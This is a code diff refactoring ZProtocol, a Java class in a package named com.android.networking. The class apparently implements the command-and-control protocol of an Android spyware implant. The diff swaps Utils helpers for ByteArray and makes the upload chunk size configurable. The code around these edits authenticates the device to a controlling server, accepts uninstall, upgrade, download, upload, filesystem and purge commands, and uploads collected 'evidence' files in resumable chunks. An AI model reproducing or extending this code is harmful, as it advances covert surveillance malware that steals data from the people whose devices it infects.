@@ -29,9 +29,9 @@ import com.android.networking.file.AutoFile;
 import com.android.networking.file.Directory;
 import com.android.networking.file.Path;
 import com.android.networking.interfaces.iKeys;
+import com.android.networking.util.ByteArray;
 import com.android.networking.util.Check;
 import com.android.networking.util.DataBuffer;
-import com.android.networking.util.Utils;
 import com.android.networking.util.WChar;
 
 /**
@@ -93,7 +93,7 @@ public class ZProtocol extends Protocol {
 		}
 
 		try {
-			transport.start();
+			transport.start();			
 
 			status.uninstall = authentication();
 
@@ -245,9 +245,9 @@ public class ZProtocol extends Protocol {
 			byte[] data;
 			if (ret != Proto.NO) {
 				if (ret == Proto.OK) {
-					data = Utils.intToByteArray(Proto.OK);
+					data = ByteArray.intToByteArray(Proto.OK);
 				} else {
-					data = Utils.intToByteArray(Proto.NO);
+					data = ByteArray.intToByteArray(Proto.NO);
 				}
 
 				if (Cfg.DEBUG) {
@@ -428,9 +428,9 @@ public class ZProtocol extends Protocol {
 			Check.ensures(dataBuffer.getPosition() == 32, "forgeAuthentication 1, wrong array size"); //$NON-NLS-1$
 		}
 
-		dataBuffer.write(Utils.padByteArray(keys.getBuildId(), 16));
+		dataBuffer.write(ByteArray.padByteArray(keys.getBuildId(), 16));
 		dataBuffer.write(keys.getInstanceId());
-		dataBuffer.write(Utils.padByteArray(Keys.getSubtype(), 16));
+		dataBuffer.write(ByteArray.padByteArray(Keys.getSubtype(), 16));
 
 		if (Cfg.DEBUG) {
 			Check.ensures(dataBuffer.getPosition() == 84, "forgeAuthentication 2, wrong array size"); //$NON-NLS-1$
@@ -440,9 +440,9 @@ public class ZProtocol extends Protocol {
 
 		// calculating digest
 		final SHA1Digest digest = new SHA1Digest();
-		digest.update(Utils.padByteArray(keys.getBuildId(), 16));
+		digest.update(ByteArray.padByteArray(keys.getBuildId(), 16));
 		digest.update(keys.getInstanceId());
-		digest.update(Utils.padByteArray(Keys.getSubtype(), 16));
+		digest.update(ByteArray.padByteArray(Keys.getSubtype(), 16));
 		digest.update(keys.getConfKey());
 		// digest.update(randBlock);
 
@@ -499,9 +499,9 @@ public class ZProtocol extends Protocol {
 			System.arraycopy(authResult, 32, cypherNonceCap, 0, cypherNonceCap.length);
 
 			final byte[] plainNonceCap = cryptoK.decryptData(cypherNonceCap);
-			final boolean nonceOK = Utils.equals(Nonce, 0, plainNonceCap, 0, Nonce.length);
+			final boolean nonceOK = ByteArray.equals(Nonce, 0, plainNonceCap, 0, Nonce.length);
 			if (nonceOK) {
-				final int cap = Utils.byteArrayToInt(plainNonceCap, 16);
+				final int cap = ByteArray.byteArrayToInt(plainNonceCap, 16);
 				if (cap == Proto.OK) {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " decodeAuth Proto OK"); //$NON-NLS-1$
@@ -582,7 +582,7 @@ public class ZProtocol extends Protocol {
 	protected boolean[] parseIdentification(final byte[] result) throws ProtocolException {
 		final boolean[] capabilities = new boolean[Proto.LASTTYPE];
 
-		final int res = Utils.byteArrayToInt(result, 0);
+		final int res = ByteArray.byteArrayToInt(result, 0);
 
 		if (res == Proto.OK) {
 			if (Cfg.DEBUG) {
@@ -643,13 +643,13 @@ public class ZProtocol extends Protocol {
 
 	protected void parsePurge(byte[] result) throws ProtocolException {
 
-		int res = Utils.byteArrayToInt(result, 0);
+		int res = ByteArray.byteArrayToInt(result, 0);
 		if (res == Proto.OK) {
-			final int len = Utils.byteArrayToInt(result, 4);
+			final int len = ByteArray.byteArrayToInt(result, 4);
 			if (len >= 12) {
 
-				long time = Utils.byteArrayToLong(result, 8);
-				int size = Utils.byteArrayToInt(result, 16);
+				long time = ByteArray.byteArrayToLong(result, 8);
+				int size = ByteArray.byteArrayToInt(result, 16);
 
 				Date date = null;
 				if (time > 0) {
@@ -680,11 +680,11 @@ public class ZProtocol extends Protocol {
 	 * 
 	 */
 	protected int parseNewConf(final byte[] result) throws ProtocolException, CommandException {
-		final int res = Utils.byteArrayToInt(result, 0);
+		final int res = ByteArray.byteArrayToInt(result, 0);
 		boolean ret = false;
 		if (res == Proto.OK) {
 
-			final int confLen = Utils.byteArrayToInt(result, 4);
+			final int confLen = ByteArray.byteArrayToInt(result, 4);
 			if (confLen > 0) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " Info: got NewConf"); //$NON-NLS-1$
@@ -739,7 +739,7 @@ public class ZProtocol extends Protocol {
 	 *             the protocol exception
 	 */
 	protected void parseDownload(final byte[] result) throws ProtocolException {
-		final int res = Utils.byteArrayToInt(result, 0);
+		final int res = ByteArray.byteArrayToInt(result, 0);
 		if (res == Proto.OK) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " parseDownload, OK"); //$NON-NLS-1$
@@ -793,7 +793,7 @@ public class ZProtocol extends Protocol {
 	 */
 	protected boolean parseUpload(final byte[] result) throws ProtocolException {
 
-		final int res = Utils.byteArrayToInt(result, 0);
+		final int res = ByteArray.byteArrayToInt(result, 0);
 		if (res == Proto.OK) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " parseUpload, OK"); //$NON-NLS-1$
@@ -859,7 +859,7 @@ public class ZProtocol extends Protocol {
 	 */
 	protected boolean parseUpgrade(final byte[] result) throws ProtocolException {
 
-		final int res = Utils.byteArrayToInt(result, 0);
+		final int res = ByteArray.byteArrayToInt(result, 0);
 		if (res == Proto.OK) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " parseUpgrade, OK"); //$NON-NLS-1$
@@ -925,7 +925,7 @@ public class ZProtocol extends Protocol {
 	 *             the protocol exception
 	 */
 	protected void parseFileSystem(final byte[] result) throws ProtocolException {
-		final int res = Utils.byteArrayToInt(result, 0);
+		final int res = ByteArray.byteArrayToInt(result, 0);
 		if (res == Proto.OK) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " parseFileSystem, OK"); //$NON-NLS-1$
@@ -1052,7 +1052,7 @@ public class ZProtocol extends Protocol {
 			}
 
 			final byte[] evidenceSize = new byte[12];
-			System.arraycopy(Utils.intToByteArray(lsize), 0, evidenceSize, 0, 4);
+			System.arraycopy(ByteArray.intToByteArray(lsize), 0, evidenceSize, 0, 4);
 
 			byte[] response = command(Proto.EVIDENCE_SIZE, evidenceSize);
 
@@ -1074,7 +1074,7 @@ public class ZProtocol extends Protocol {
 					continue;
 				}
 
-				if (Cfg.PROTOCOL_RESUME && file.getSize() > 8 * 1024) {
+				if (Cfg.PROTOCOL_RESUME && file.getSize() > Cfg.PROTOCOL_CHUNK) {
 					sendResumeEvidence(file);
 				} else {
 					sendEvidence(file);
@@ -1091,7 +1091,7 @@ public class ZProtocol extends Protocol {
 	}
 
 	private boolean sendResumeEvidence(AutoFile file) throws TransportException, ProtocolException {
-		int chunk = 8 * 1024;
+		int chunk = Cfg.PROTOCOL_CHUNK;
 		int size = (int) file.getSize();
 
 		final byte[] requestBase = new byte[5 * 4];
@@ -1166,7 +1166,7 @@ public class ZProtocol extends Protocol {
 	}
 
 	private void writeBuf(byte[] buffer, int pos, int whatever) {
-		System.arraycopy(Utils.intToByteArray(whatever), 0, buffer, pos, 4);
+		System.arraycopy(ByteArray.intToByteArray(whatever), 0, buffer, pos, 4);
 	}
 
 	private void writeBuf(byte[] buffer, int pos, byte[] whatever, int offset, int len) {
@@ -1191,7 +1191,7 @@ public class ZProtocol extends Protocol {
 
 		final byte[] plainOut = new byte[content.length + 4];
 
-		System.arraycopy(Utils.intToByteArray(content.length), 0, plainOut, 0, 4);
+		System.arraycopy(ByteArray.intToByteArray(content.length), 0, plainOut, 0, 4);
 		System.arraycopy(content, 0, plainOut, 4, content.length);
 
 		byte[] response = command(Proto.EVIDENCE, plainOut);
@@ -1233,8 +1233,8 @@ public class ZProtocol extends Protocol {
 	 */
 	protected int parseLogOffset(final byte[] result) throws ProtocolException {
 		if (checkOk(result)) {
-			if (Utils.byteArrayToInt(result, 4) == 4) {
-				return Utils.byteArrayToInt(result, 8);
+			if (ByteArray.byteArrayToInt(result, 4) == 4) {
+				return ByteArray.byteArrayToInt(result, 8);
 			}
 			return 0;
 		}
@@ -1290,7 +1290,7 @@ public class ZProtocol extends Protocol {
 		}
 		final int dataLen = data.length;
 		final byte[] plainOut = new byte[dataLen + 4];
-		System.arraycopy(Utils.intToByteArray(command), 0, plainOut, 0, 4);
+		System.arraycopy(ByteArray.intToByteArray(command), 0, plainOut, 0, 4);
 		System.arraycopy(data, 0, plainOut, 4, data.length);
 
 		try {
@@ -1365,7 +1365,7 @@ public class ZProtocol extends Protocol {
 	 *             the protocol exception
 	 */
 	private boolean checkOk(final byte[] result) throws ProtocolException {
-		final int res = Utils.byteArrayToInt(result, 0);
+		final int res = ByteArray.byteArrayToInt(result, 0);
 
 		if (res == Proto.OK) {
 			return true;
@@ -1383,4 +1383,5 @@ public class ZProtocol extends Protocol {
 			throw new ProtocolException();
 		}
 	}
+
 }
